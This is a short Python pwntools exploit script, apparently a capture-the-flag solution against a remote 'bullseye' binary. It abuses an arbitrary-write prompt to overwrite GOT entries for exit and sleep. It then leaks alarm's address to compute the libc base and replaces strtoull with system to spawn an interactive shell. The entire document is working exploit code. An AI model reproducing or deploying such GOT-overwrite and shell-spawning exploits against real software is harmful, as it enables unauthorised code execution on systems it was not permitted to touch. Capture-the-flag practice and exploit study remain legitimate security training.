from pwn import *



def mov(where, what):
    p.sendlineafter("Where do you want to write to?\n", hex(where))
    p.sendlineafter("What do you want to write?\n", hex(what))


exe = ELF("bullseye")
libc = ELF("libc6_2.30-0ubuntu2.2_amd64.so")
context.binary = exe
p = remote('jh2i.com', 50031)
ret = 0x040125f

p.recvline()
p.recvline()
mov(exe.got["exit"], exe.sym['main'])
mov(exe.got["sleep"], ret)

alarm = int(p.recvline().strip(), 16)
log.success("Alarm --> %s" % hex(alarm))
libc_base = alarm - libc.sym['alarm']
log.success("Libc base @ 0x%x", libc_base)

sleep(2)
mov(exe.got['strtoull'], libc_base + libc.sym['system'])
sleep(1)
p.sendline("sh")
p.recvuntil("Where do you want to write to?\n")
p.interactive()
